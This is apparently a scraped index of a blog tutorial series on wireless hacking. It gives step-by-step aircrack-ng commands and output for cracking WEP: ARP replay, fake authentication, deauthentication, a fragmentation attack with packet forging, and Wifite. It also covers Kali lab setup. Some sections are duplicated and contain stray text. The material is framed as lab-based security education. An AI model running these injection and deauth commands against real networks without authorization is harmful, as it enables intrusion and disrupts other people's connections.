the attack demands a substantial volume of packets — on the order of 10,000 — to be effective. Such high traffic is typically found only on busy networks, making it challenging to gather enough data. To address this limitation, attackers often resort to an ARP replay technique. ","date":"2025-05-26","objectID":"/posts/wireless03/:5:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#retrieve-plaintext"},{"categories":["Guides"],"collections":["Getting Started"],"content":"37.3 Arp Replay attack With an ARP replay attack, an adversary captures an ARP request and repeatedly injects it into the network. This forces the client or network devices to generate many packets, each with new initialization vectors and keystream fragments. By collecting these replayed packets, the attacker gains access to a wealth of encrypted data that can be analyzed. For example, sending a single ARP request repeatedly in a network with one client can produce multiple keystream samples to capture and exploit. graph TD Capture[\"Capture Network Packets\"] ARP_Packets[\"Identify ARP Packets\"] ARP_Request[\"ARP Request Packet\\n(e.g. Who has 10.20.242.34?)\"] ARP_Reply[\"ARP Reply Packet\\n(e.g. I have 10.20.242.34\\nMAC: e4:35:54:ad:4f:45)\"] Predictable_Header[\"Known 16-byte Header\"] Extract_Keystream[\"Extract First 16 Bytes of Keystream\"] Use_Keystream[\"Use Keystream to Decrypt Other Packets\"] Capture --\u003e ARP_Packets ARP_Packets --\u003e ARP_Request ARP_Packets --\u003e ARP_Reply ARP_Request --\u003e Predictable_Header ARP_Reply --\u003e Predictable_Header Predictable_Header --\u003e Extract_Keystream Extract_Keystream --\u003e Use_Keystream graph TD Capture[\"Capture Network Packets\"] ARP_Packets[\"Identify ARP Packets\"] ARP_Request[\"ARP Request Packet\\n(e.g. Who has 10.20.242.34?)\"] ARP_Reply[\"ARP Reply Packet\\n(e.g. I have 10.20.242.34\\nMAC: e4:35:54:ad:4f:45)\"] Predictable_Header[\"Known 16-byte Header\"] Extract_Keystream[\"Extract First 16 Bytes of Keystream\"] Use_Keystream[\"Use Keystream to Decrypt Other Packets\"] Capture --\u003e ARP_Packets ARP_Packets --\u003e ARP_Request ARP_Packets --\u003e ARP_Reply ARP_Request --\u003e Predictable_Header ARP_Reply --\u003e Predictable_Header Predictable_Header --\u003e Extract_Keystream Extract_Keystream --\u003e Use_Keystream graph TD Capture[\"Capture Network Packets\"] ARP_Packets[\"Identify ARP Packets\"] ARP_Request[\"ARP Request Packet\\n(e.g. Who has 10.20.242.34?)\"] ARP_Reply[\"ARP Reply Packet\\n(e.g. I have 10.20.242.34\\nMAC: e4:35:54:ad:4f:45)\"] Predictable_Header[\"Known 16-byte Header\"] Extract_Keystream[\"Extract First 16 Bytes of Keystream\"] Use_Keystream[\"Use Keystream to Decrypt Other Packets\"] Capture --\u003e ARP_Packets ARP_Packets --\u003e ARP_Request ARP_Packets --\u003e ARP_Reply ARP_Request --\u003e Predictable_Header ARP_Reply --\u003e Predictable_Header Predictable_Header --\u003e Extract_Keystream Extract_Keystream --\u003e Use_Keystream graph TD Capture[\"Capture Network Packets\"] ARP_Packets[\"Identify ARP Packets\"] ARP_Request[\"ARP Request Packet\\n(e.g. Who has 10.20.242.34?)\"] ARP_Reply[\"ARP Reply Packet\\n(e.g. I have 10.20.242.34\\nMAC: e4:35:54:ad:4f:45)\"] Predictable_Header[\"Known 16-byte Header\"] Extract_Keystream[\"Extract First 16 Bytes of Keystream\"] Use_Keystream[\"Use Keystream to Decrypt Other Packets\"] Capture --\u003e ARP_Packets ARP_Packets --\u003e ARP_Request ARP_Packets --\u003e ARP_Reply ARP_Request --\u003e Predictable_Header ARP_Reply --\u003e Predictable_Header Predictable_Header --\u003e Extract_Keystream Extract_Keystream --\u003e Use_Keystream ","date":"2025-05-26","objectID":"/posts/wireless03/:5:3","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#arp-replay-attack"},{"categories":["Guides"],"collections":["Getting Started"],"content":"38 Exploiting WEP To sniff packets on a network without being connected, you need to switch your wireless adapter into monitor mode. This special mode allows the adapter to capture all wireless traffic in its vicinity, unlike the default managed mode which only processes packets addressed to your device. Monitor mode is essential for tasks such as network analysis and packet sniffing. First, you need to identify the wireless adapter you want to use. You can do this by running the command iwconfig, which lists all wireless interfaces and their current modes. Once you know the adapter’s name (for example, wlan0), you can change its mode from managed to monitor using the command sudo airmon-ng start wlan0. Note On some wireless adapters, enabling monitor mode creates a new interface with a mon suffix (e.g., wlan0mon). However, some adapters, like the Realtek RTL8814AU, enable monitor mode directly on the existing interface without renaming it.ar15 lf556ar15 lf556 After switching to monitor mode, you can verify that the change was successful by running iwconfig again. This will show the new mode and the updated interface name. When you are done with packet sniffing and want to revert to the standard managed mode, you can stop monitor mode by running sudo airmon-ng stop wlan0 (or the appropriate interface name). This will restore your adapter to its normal state, ready to connect to networks as usual. Switching to monitor mode is a powerful technique that gives you deep insight into wireless traffic around you, but remember to always use it responsibly and respect privacy and legal guidelines. ","date":"2025-05-26","objectID":"/posts/wireless03/:6:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#exploiting-wep"},{"categories":["Guides"],"collections":["Getting Started"],"content":"38.1 Case 1: Capturing Packets (WEP Passive Attack) As remembered from our discussion above, we know that we need to get keystreams along with different IVs, and to achieve this, we need both ciphertext and plaintext. To obtain plaintext data, we will make use of ARP packets. So, let’s capture those packets. In this example, we are assuming the network is busy, so we will not combine this with an ARP replay attack and will simply try to get as many keystreams as possible. First, change your network adapter mode to monitor. You can do this by running the following command, replacing wlan0 with your adapter’s monitor mode interface name if different Once this is done, use airodump-ng followed by the name of the adapter to list all available Access Points nearby. You will see a list of networks, and you need to identify the ones where the ENC used is WEP. ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo airodump-ng wlan0 CH 14 ][ Elapsed: 36 s ][ 2025-06-01 20:36 ][ enabled AP selection BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID ... XX:XX:XX:XX:XX:XX -28 57 2256 29 3 54 WEP WEP wifi-old BSSID STATION PWR Rate Lost Frames Notes Probes XX:XX:XX:XX:XX:X XX:XX:XX:XX:XX:XX -29 54 -54 1737 2252 (not associated) XX:XX:XX:XX:XX:XX -49 0 - 1 0 2 (not associated) XX:XX:XX:XX:XX:XX -49 0 - 1 0 2 ... In my case, the Access Point named wifi-old is using a WEP connection. Now we will capture packets from this target network. To do so, run the following command to capture packets, replacing the BSSID and channel with those of the victim network: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo airodump-ng --bssid \u003ctarget-BSSID\u003e -c \u003cchannel\u003e -w wep.cap wlan0 CH 3 ][ Elapsed: 24 s ][ 2025-06-01 20:41 BSSID PWR RXQ Beacons #Data, #/s CH XX:XX:XX:XX:XX:XX -28 0 268 10561 384 3 BSSID STATION PWR Rate XX:XX:XX:XX:XX:XX XX:XX:XX:XX:XX:XX -29 54 -54 0 10534 The --write option saves all captured packets to the specified file. Capture around 10,000 packets; the capture file will be saved in your current working directory. After you have enough packets, run airecrack-ng with the capture file to try and recover the password: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo airecrack-ng wep.cap Reading packets, please wait... Opening capture-01.cap Read 24937 packets. # BSSID Got 24776 out of 20000 IVsStarting PTW attack with 24776 ivs. 1 XX:XX:XX:XX:XX:XX \u003cESSID\u003e WEP (24776 IVs) Choosing first network as target. Reading packets, please wait... Opening capture-01.cap Read 24937 packets. 1 potential targets Attack will be restarted every 5000 captured ivs. Aircrack-ng 1.7 [00:00:00] Tested 6 keys (got 24776 IVs) KB depth byte(vote) 0 0/ 1 XX(35840) XX(32256) XX(30208) 1 0/ 5 XX(32000) XX(31232) XX(31232) 2 0/ 1 XX(34816) XX(31232) XX(30976) 3 0/ 1 XX(33792) XX(31744) XX(30976) 4 0/ 1 XX(32768) XX(31488) XX(31488) KEY FOUND! [ XX:XX:XX:XX:XX ] Decrypted correctly: 100% ","date":"2025-05-26","objectID":"/posts/wireless03/:6:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#case-1-capturing-packets-wep-passive-attack"},{"categories":["Guides"],"collections":["Getting Started"],"content":"38.2 Case 2: Accelerating ARP Replay (WEP Active Attack) In Case 1, we passively captured packets on a busy network to collect enough IVs to eventually crack the WEP key. However, this approach becomes inefficient on a quiet or low-traffic network. To address this, we can trigger the network to generate traffic using an ARP replay attack. This method injects ARP requests, which forces the Access Point to respond, thereby increasing the number of encrypted packets (and IVs) we can collect. This is considered an active attack because we are actively injecting packets into the network to provoke responses. This approach is effective when at least one client is associated with the access point. Without an active client, this method won’t work. First, make sure your wireless adapter is in monitor mode. Use the following command to start listening and identify a WEP-encrypted network and its associated clients: ┌──(proxygeek㉿VMware-kali)-[~] └─$ airodump-ng wlan0 We associate ourselves with the access point so it accepts our injection packets. This is done using the following command: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo aireplay-ng -1 3600 -q 10 -a \u003ctarget-BSSID\u003e wlan0 Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6 Authentication successful Association successful :-) (AID: 1) Sending keep-alive packet every 10 seconds... -1 Fake auth attack 3600 Keep association for 1 hour -q 10 Send keep-alive every 10 seconds -a BSSID of the target AP The BSSID, channel, and a client’s MAC address connected to the target network. Once identified, start a targeted packet capture: Tip If no clients are currently connected, you won’t be able to perform the ARP replay attack effectively. Consider switching to a different AP or wait until a device connects. ┌──(proxygeek㉿VMware-kali)-[~] └─$ airodump-ng --bssid \u003ctarget-BSSID\u003e -c \u003cchannel\u003e -w wep-arp wlan0 Then, in another terminal, send ARP request packets to stimulate traffic: ┌──(proxygeek㉿VMware-kali)-[~] └─$ aireplay-ng --arpreplay -b \u003ctarget-BSSID\u003e -h \u003cclient-MAC\u003e wlan0 18:57:12 Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6 18:57:13 Found BSSID \"XX:XX:XX:XX:XX:XX\" on channel 6 18:57:14 Using the MAC address of the client: XX:XX:XX:XX:XX:XX 18:57:15 Sending ARP request packets... 18:57:16 Got ARP request from client XX:XX:XX:XX:XX:XX 18:57:16 Injecting ARP request to access point 18:57:17 ARP packet reinjected successfully (1/30 sent) 18:57:18 ARP packet reinjected successfully (2/30 sent) 18:57:19 ARP packet reinjected successfully (3/30 sent) ... -b BSSID of the target access point. -h MAC address of the associated client. You should start seeing a significant increase in the number of captured data packets in your airodump-ng session. Once you’ve captured enough IVs (typically 10,000+), attempt to crack the key using: ┌──(proxygeek㉿VMware-kali)-[~] └─$ aircrack-ng wep-arp.cap If successful, the WEP key will be displayed, allowing access to the network. Tip If you don’t see packets increasing, try sending a few deauth packets to refresh the client’s connection: ┌──(proxygeek㉿VMware-kali)-[~] └─$ aireplay-ng --deauth 5 -a \u003ctarget-BSSID\u003e -c \u003cclient-MAC\u003e wlan0 18:55:44 Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6 18:55:45 Sending DeAuth to station -- STMAC: [XX:XX:XX:XX:XX:XX] 18:55:45 DeAuth packet sent 1/5 18:55:46 DeAuth packet sent 2/5 18:55:47 DeAuth packet sent 3/5 18:55:48 DeAuth packet sent 4/5 18:55:49 DeAuth packet sent 5/5 At the end of the process, remember to disable monitor mode and switch your adapter back to managed mode ","date":"2025-05-26","objectID":"/posts/wireless03/:6:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#case-2-accelerating-arp-replay-wep-active-attack"},{"categories":["Guides"],"collections":["Getting Started"],"content":"38.3 Case 3: Fragmentation Attack Authentication (WEP Active Advanced Attack) In the first two cases, we focused on capturing packets either passively or actively by accelerating traffic through ARP replay attacks. Both techniques depend on the presence of at least one client connected to the WEP network to generate sufficient encrypted traffic. But what if the network is quiet, or no clients are connected? In such scenarios, traditional ARP replay attacks fail because there is no traffic to capture or stimulate. This third case explores an advanced attack combining fragmentation and fake authentication techniques. Fragmentation attacks exploit how WEP handles small packet fragments, allowing us to recover a portion of the keystream without needing the full data packet. Once the keystream is recovered, it is possible to forge a valid encrypted packet — typically an ARP request — which can then be injected into the network. This injection triggers the Access Point to respond and generate new encrypted packets with fresh Initialization Vectors (IVs). The beauty of this method is that it works even on idle networks without any active clients, filling the gap left by the previous techniques. It highlights a critical weakness in WEP’s design and makes cracking such networks feasible. To start, you first need to put your wireless adapter into monitor mode, enabling packet capture and injection on the wireless channel: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo airmon-ng start wlan0 Next, scan for WEP-enabled Access Points in range: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo airodump-ng wlan0 Identify your target by its BSSID and operating channel. Once identified, begin capturing packets specifically from this AP: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo airodump-ng --bssid \u003cBSSID\u003e -c \u003cchannel\u003e -w wep_frag wlan0 Since you have no legitimate client to associate with, perform a fake authentication to trick the AP into accepting your injections: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo aireplay-ng -1 0 -a \u003cBSSID\u003e -h \u003cfake-MAC\u003e wlan0 This creates a fake association that allows packet injection. Now, launch the fragmentation attack to recover a partial keystream by exploiting small packet fragments sent by the AP: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo aireplay-ng -5 -b \u003cBSSID\u003e -h \u003cfake-MAC\u003e wlan0 Once a keystream is extracted, forge an encrypted ARP request packet using the recovered keystream. This forged packet will be used to inject traffic and stimulate the network: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo packetforge-ng -0 -a \u003cBSSID\u003e -h \u003cfake-MAC\u003e -k \u003csource-IP\u003e -l \u003cdestination-IP\u003e -y \u003ckeystream-file\u003e -w arp-request Using packet type: ARP Request Reading IVs from keystream file: keystream.txt Forge a packet with the following parameters: Source MAC address : 66:77:88:99:AA:BB Destination MAC : Broadcast (FF:FF:FF:FF:FF:FF) BSSID : 00:11:22:33:44:55 Packet type : ARP Request Writing forged packet to arp-request Forge completed successfully. -0 Forge ARP request packet (packet type 0) -a BSSID of the target Access Point -h Fake MAC address to use as source -k Source IP address -l Destination IP address -y Keystream file generated from fragmentation attack -w Output file name to save the forged packet Inject the forged packet into the network: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo aireplay-ng -2 -r arp-request wlan0 This injection causes the AP to generate new encrypted packets, increasing the number of IVs available for capture. With traffic now stimulated, continue to collect IVs with an ARP replay attack: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo aireplay-ng --arpreplay -b \u003cBSSID\u003e -h \u003cfake-MAC\u003e wlan0 Monitor the number of IVs captured until you have enough (usually 10,000+). Finally, crack the WEP key using aircrack-ng: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo aircrack-ng wep_frag.cap If successful, you will obtain the WEP key and gain access to the network. ","date":"2025-05-26","objectID":"/posts/wireless03/:6:3","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#case-3-fragmentation-attack-authentication-wep-active-advanced-attack"},{"categories":["Guides"],"collections":["Getting Started"],"content":"39 Automation WEP As we continue to explore wireless security in a controlled and isolated environment, we can utilize tools like Wifite2 to audit and capture network data. For example, the following command: ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo wifite --kill . . .´ · . . · `. wifite2 2.7.0 : : : (¯) : : : a wireless auditor by derv82 `. · ` /¯\\ ´ · .´ maintained by kimocoder ` /¯¯¯\\ ´ https://github.com/kimocoder/wifite2 [+] option: kill conflicting processes enabled [+] Using wlan0 already in monitor mode This command helps stop conflicting processes (like NetworkManager or wpa_supplicant), and sets your wireless interface to monitor mode, which is essential for packet sniffing and capturing data from nearby networks. Once in monitor mode, you can analyze various wireless networks in your environment. Here is a sample of the output you might see when running wifite: NUM ESSID CH ENCR PWR WPS CLIENT --- ------------------------- --- ----- ---- --- ------ 1 (1X:XX:XX:XX:XX:XX) 1 WPA 99db no 2 (2X:XX:XX:XX:XX:XX) 11 WPA 99db no 3 WIFI01-GUEST 8 WPA-P 63db no 4 WIFI02-GUEST 6 WPA-P 38db lock 5 (3X:XX:XX:XX:XX:XX) 6 WPA 38db no 6 WIFI03-GUEST 6 WPA-P 30db lock 7 (4X:XX:XX:XX:XX:XX) 6 WPA 29db no 8 (5X:XX:XX:XX:XX:XX) 1 WPA-P 21db no 9 WIFI04-GUEST 1 WPA-P 20db yes 10 WIFI05-GUEST 6 WPA-P 20db yes 11 WIFI06-GUEST 11 WPA-P 19db lock In this list, each entry represents a wireless access point (AP) detected within range, with information about its ESSID (network name), channel, encryption type, signal strength (PWR), WPS status, and connected clients. This tool is essential for understanding and evaluating the security of wireless networks within a controlled and isolated environment, providing insight into nearby networks and preparing for more complex penetration testing in future parts of this series. ","date":"2025-05-26","objectID":"/posts/wireless03/:7:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#automation-wep"},{"categories":["Guides"],"collections":["Getting Started"],"content":"40 Conclusion In this third part, we focused on the practical weaknesses of the WEP encryption protocol. We explored passive and active attack techniques, including packet capturing, ARP replay injection, and fragmentation attacks combined with fake authentication. These real-world examples highlighted why WEP is no longer considered secure and should be avoided whenever possible. Additionally, we introduced automation tools like Wifite to streamline the process of auditing WEP networks, making attacks more accessible while reinforcing the importance of understanding the underlying concepts. With a solid grasp of WEP vulnerabilities and attack methods, we are now ready to move forward and tackle more modern wireless security protocols. In the next part, we will dive into WPA and WPA2, uncovering their strengths and weaknesses, and learning how to capture handshakes and perform dictionary attacks. ","date":"2025-05-26","objectID":"/posts/wireless03/:8:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#conclusion"},{"categories":["Guides"],"collections":["Getting Started"],"content":"25 About In Part 2 of our Wireless Hacking series, we shift our focus from theory to practice. Having explored the fundamental concepts of wireless networks and security in the first part of this series, it’s now time to transition from theoretical knowledge to hands-on experience. While understanding the theory behind wireless attacks is essential, practical skills are just as important in mastering wireless security. However, before we begin exploring the world of wireless hacking and penetration testing, it’s critical to create a safe and controlled environment in which to learn Caution Ethical Hacking Reminder: Only perform wireless penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical. ","date":"2025-05-23","objectID":"/posts/wireless02/:1:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#about"},{"categories":["Guides"],"collections":["Getting Started"],"content":"26 Environment Before performing any wireless attacks or experiments, it’s crucial to set up a safe and isolated testing environment. Here are two solid options depending on your setup and preferences: ","date":"2025-05-23","objectID":"/posts/wireless02/:2:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#environment"},{"categories":["Guides"],"collections":["Getting Started"],"content":"26.1 Option 1: Installing Kali Linux on a Virtual Machine Recommended software: VirtualBox or VMware Workstation Player (free for personal use) or QEMU/KVM. 26.1.1 Option 1 Downloads Links Kali Linux Virtual Machines Image Kali Linux ISO Image 26.1.2 Option 1 Installation Steps Make sure virtualization (Intel VT or AMD-V) is enabled in your computer’s BIOS/UEFI settings. Allocate at least 2 GB of RAM and 20 GB of disk space. Set the network adapter to “Bridged Adapter” to give Kali access to your local network. Use a USB Wi-Fi adapter that supports monitor mode, and pass it through to the VM. ","date":"2025-05-23","objectID":"/posts/wireless02/:2:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#option-1-installing-kali-linux-on-a-virtual-machine"},{"categories":["Guides"],"collections":["Getting Started"],"content":"26.1 Option 1: Installing Kali Linux on a Virtual Machine Recommended software: VirtualBox or VMware Workstation Player (free for personal use) or QEMU/KVM. 26.1.1 Option 1 Downloads Links Kali Linux Virtual Machines Image Kali Linux ISO Image 26.1.2 Option 1 Installation Steps Make sure virtualization (Intel VT or AMD-V) is enabled in your computer’s BIOS/UEFI settings. Allocate at least 2 GB of RAM and 20 GB of disk space. Set the network adapter to “Bridged Adapter” to give Kali access to your local network. Use a USB Wi-Fi adapter that supports monitor mode, and pass it through to the VM. ","date":"2025-05-23","objectID":"/posts/wireless02/:2:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#option-1-downloads-links"},{"categories":["Guides"],"collections":["Getting Started"],"content":"26.1 Option 1: Installing Kali Linux on a Virtual Machine Recommended software: VirtualBox or VMware Workstation Player (free for personal use) or QEMU/KVM. 26.1.1 Option 1 Downloads Links Kali Linux Virtual Machines Image Kali Linux ISO Image 26.1.2 Option 1 Installation Steps Make sure virtualization (Intel VT or AMD-V) is enabled in your computer’s BIOS/UEFI settings. Allocate at least 2 GB of RAM and 20 GB of disk space. Set the network adapter to “Bridged Adapter” to give Kali access to your local network. Use a USB Wi-Fi adapter that supports monitor mode, and pass it through to the VM. ","date":"2025-05-23","objectID":"/posts/wireless02/:2:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#option-1-installation-steps"},{"categories":["Guides"],"collections":["Getting Started"],"content":"26.2 Option 2: Installing Kali Linux on a Raspberry Pi Required hardware: Raspberry Pi 4 MicroSD card (minimum 16 GB) Power supply, keyboard, mouse, and HDMI screen 26.2.1 Option 2 Downloads Links Kali Linux ARM image for Raspberry Pi 26.2.2 Option 2 Installations Steps Use Raspberry Pi Imager or a similar tool to flash the Kali image onto the microSD card. Insert the card into the Raspberry Pi, connect all peripherals, and boot it up. Follow the on-screen setup instructions and ensure your Wi-Fi adapter is compatible with monitor mode. ","date":"2025-05-23","objectID":"/posts/wireless02/:2:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#option-2-installing-kali-linux-on-a-raspberry-pi"},{"categories":["Guides"],"collections":["Getting Started"],"content":"26.2 Option 2: Installing Kali Linux on a Raspberry Pi Required hardware: Raspberry Pi 4 MicroSD card (minimum 16 GB) Power supply, keyboard, mouse, and HDMI screen 26.2.1 Option 2 Downloads Links Kali Linux ARM image for Raspberry Pi 26.2.2 Option 2 Installations Steps Use Raspberry Pi Imager or a similar tool to flash the Kali image onto the microSD card. Insert the card into the Raspberry Pi, connect all peripherals, and boot it up. Follow the on-screen setup instructions and ensure your Wi-Fi adapter is compatible with monitor mode. ","date":"2025-05-23","objectID":"/posts/wireless02/:2:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#option-2-downloads-links"},{"categories":["Guides"],"collections":["Getting Started"],"content":"26.2 Option 2: Installing Kali Linux on a Raspberry Pi Required hardware: Raspberry Pi 4 MicroSD card (minimum 16 GB) Power supply, keyboard, mouse, and HDMI screen 26.2.1 Option 2 Downloads Links Kali Linux ARM image for Raspberry Pi 26.2.2 Option 2 Installations Steps Use Raspberry Pi Imager or a similar tool to flash the Kali image onto the microSD card. Insert the card into the Raspberry Pi, connect all peripherals, and boot it up. Follow the on-screen setup instructions and ensure your Wi-Fi adapter is compatible with monitor mode. ","date":"2025-05-23","objectID":"/posts/wireless02/:2:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#option-2-installations-steps"},{"categories":["Guides"],"collections":["Getting Started"],"content":"27 Architecture The architecture of a Wi-Fi hacking lab is designed to create a controlled environment for safely testing wireless security. At the core of the lab is the Attacker Machine (Kali Linux), which runs penetration testing tools to perform attacks on the Target Access Point (Test AP). The Test Client Device connects to the AP, simulating a user’s interaction with the network. The Isolation Switch/Firewall ensures the lab is separated from the wider network and blocks unauthorized internet access, protecting the external network from any potential disruption. Finally, the Monitoring \u0026 Logging Station captures and analyzes the traffic between the attacker, the AP, and the client, allowing for detailed analysis and logging of all actions. This setup ensures that wireless security testing can be performed safely and ethically within an isolated environment. graph TD attacker[\"Attacker Machine (Kali Linux)\"] ap[\"Target Access Point (Test AP)\"] client[\"Test Client Device\"] firewall[\"Isolation Switch / Firewall\"] monitor[\"Monitoring \u0026 Logging Station\"] Internet[\"Internet\"] attacker --\u003e|Inject \u0026 Capture Traffic| ap client --\u003e|Connects to| ap ap --\u003e|Connects through| firewall attacker --\u003e|Sends data for analysis| monitor client --\u003e|Traffic monitored by| monitor firewall -.-\u003e|Blocks traffic to Internet| Internet class attacker,ap,client,firewall,monitor,Internet neutral; graph TD attacker[\"Attacker Machine (Kali Linux)\"] ap[\"Target Access Point (Test AP)\"] client[\"Test Client Device\"] firewall[\"Isolation Switch / Firewall\"] monitor[\"Monitoring \u0026 Logging Station\"] Internet[\"Internet\"] attacker --\u003e|Inject \u0026 Capture Traffic| ap client --\u003e|Connects to| ap ap --\u003e|Connects through| firewall attacker --\u003e|Sends data for analysis| monitor client --\u003e|Traffic monitored by| monitor firewall -.-\u003e|Blocks traffic to Internet| Internet class attacker,ap,client,firewall,monitor,Internet neutral; graph TD attacker[\"Attacker Machine (Kali Linux)\"] ap[\"Target Access Point (Test AP)\"] client[\"Test Client Device\"] firewall[\"Isolation Switch / Firewall\"] monitor[\"Monitoring \u0026 Logging Station\"] Internet[\"Internet\"] attacker --\u003e|Inject \u0026 Capture Traffic| ap client --\u003e|Connects to| ap ap --\u003e|Connects through| firewall attacker --\u003e|Sends data for analysis| monitor client --\u003e|Traffic monitored by| monitor firewall -.-\u003e|Blocks traffic to Internet| Internet class attacker,ap,client,firewall,monitor,Internet neutral; graph TD attacker[\"Attacker Machine (Kali Linux)\"] ap[\"Target Access Point (Test AP)\"] client[\"Test Client Device\"] firewall[\"Isolation Switch / Firewall\"] monitor[\"Monitoring \u0026 Logging Station\"] Internet[\"Internet\"] attacker --\u003e|Inject \u0026 Capture Traffic| ap client --\u003e|Connects to| ap ap --\u003e|Connects through| firewall attacker --\u003e|Sends data for analysis| monitor client --\u003e|Traffic monitored by| monitor firewall -.-\u003e|Blocks traffic to Internet| Internet class attacker,ap,client,firewall,monitor,Internet neutral; ","date":"2025-05-23","objectID":"/posts/wireless02/:3:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#architecture"},{"categories":["Guides"],"collections":["Getting Started"],"content":"28 Checksum Warning Before proceeding with creating the virtual machine, it’s strongly recommended to verify the SHA256 checksum of the Kali Linux ISO. This helps ensure that the file has not been corrupted during download or maliciously altered. Verifying the checksum is an important security step to ensure the integrity of the ISO file, especially when downloading from the internet. Without this verification, you could be running a compromised version of Kali Linux, which could expose your system to unnecessary risks. Here’s how you can verify the checksum and ensure that the ISO is safe to use: #!/bin/bash set -e VERSION=\"2025.1c\" BASE_URL=\"https://cdimage.kali.org/kali-$VERSION\" ISO=\"kali-linux-$VERSION-installer-amd64.iso\" echo \"Creating download directory...\" mkdir -p ~/Downloads/iso/kali-$VERSION cd ~/Downloads/iso/kali-$VERSION echo \"Downloading Kali Linux ISO and verification files...\" wget -q --show-progress \"$BASE_URL/$ISO\" wget -q --show-progress \"$BASE_URL/SHA256SUMS\" wget -q --show-progress \"$BASE_URL/SHA256SUMS.gpg\" echo \"Importing Kali Linux official GPG key...\" gpg --keyserver hkps://keyserver.ubuntu.com --recv-keys 44C6513A8E4FB3D30875F758ED444FF07D8D0BF6 echo \"Verifying SHA256SUMS signature...\" gpg --verify SHA256SUMS.gpg SHA256SUMS echo \"Verifying ISO checksum...\" sha256sum -c SHA256SUMS 2\u003e/dev/null | grep \"$ISO\" echo \"All done! If you see '$ISO: OK' above, your ISO is verified and safe to use.\" Creating download directory... Downloading Kali Linux ISO and verification files... kali-linux-2025.1c-installer 100%[===========================================\u003e] 4.13G 107MB/s in 41s SHA256SUMS 100%[===========================================\u003e] 2.80K --.-KB/s in 0s SHA256SUMS.gpg 100%[===========================================\u003e] 833 --.-KB/s in 0s Importing Kali Linux official GPG key... gpg: key ED444FF07D8D0BF6: 2 duplicate signatures removed gpg: key ED444FF07D8D0BF6: \"Kali Linux Repository \u003cdevel@kali.org\u003e\" not changed gpg: Total number processed: 1 gpg: unchanged: 1 Verifying SHA256SUMS signature... gpg: Signature made Thu 24 Apr 2025 05:31:10 AM CEST gpg: using RSA key 827C8569F2518CC677FECA1AED65462EC8D5E4C5 gpg: checking the trustdb gpg: marginals needed: 3 completes needed: 1 trust model: pgp gpg: depth: 0 valid: 2 signed: 0 trust: 0-, 0q, 0n, 0m, 0f, 2u gpg: next trustdb check due at 2028-04-17 gpg: Good signature from \"Kali Linux Archive Automatic Signing Key (2025) \u003cdevel@kali.org\u003e\" [ultimate] Verifying ISO checksum... kali-linux-2025.1c-installer-amd64.iso: OK kali-linux-2025.1c-installer-amd64.iso.torrent: FAILED open or read All done! If you see 'kali-linux-2025.1c-installer-amd64.iso: OK' above, your ISO is verified and safe to use. ","date":"2025-05-23","objectID":"/posts/wireless02/:4:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#checksum"},{"categories":["Guides"],"collections":["Getting Started"],"content":"29 VMware Workstation To begin, open VMware Workstation on your system. This graphical tool will allow you to easily manage virtual machines. Once the application is open, click on the “Create a New Virtual Machine” button. In the wizard that appears, select “Installer disc image file (iso)” and browse to the Kali Linux ISO you previously downloaded. Next, choose the OS type as Linux, and for the version, select Debian 10.x 64-bit—this works well for Kali Linux. You’ll then be prompted to assign system resources to the VM. It is recommended to allocate at least 2GB of RAM, but 4GB (4096MB) is ideal if your host machine allows it. You should also assign 2 or more CPU cores to ensure smooth performance. After this, you’ll create a virtual hard disk—make sure it is at least 20GB, and dynamically allocated to save space. Once these steps are complete, click Finish to create and launch the virtual machine. ","date":"2025-05-23","objectID":"/posts/wireless02/:5:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#vmware-workstation"},{"categories":["Guides"],"collections":["Getting Started"],"content":"29.1 Configuration Before installing Kali, a few adjustments to the virtual hardware settings are necessary. In VMware Workstation, select your newly created Kali VM and click Edit Virtual Machine Settings to access its configuration panel. Inside this panel, make sure that the Kali Linux ISO is correctly attached as the boot media under the CD/DVD section. Next, review the network settings. By 